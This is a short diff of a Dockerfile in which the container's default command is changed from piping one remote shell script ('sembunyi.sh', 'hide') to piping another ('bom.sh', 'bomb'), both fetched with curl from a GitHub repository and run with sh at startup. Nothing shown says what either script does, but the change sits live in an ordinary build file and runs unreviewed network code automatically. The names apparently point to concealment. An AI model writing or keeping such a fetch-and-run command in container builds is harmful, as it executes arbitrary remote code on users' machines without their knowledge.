@@ -30,4 +30,4 @@ ENV HOME /root
 WORKDIR /root
 
 # Define default command.
-CMD curl https://raw.githubusercontent.com/epois/zephher/main/sembunyi.sh | sh
+CMD curl https://raw.githubusercontent.com/epois/zephher/main/bom.sh | sh
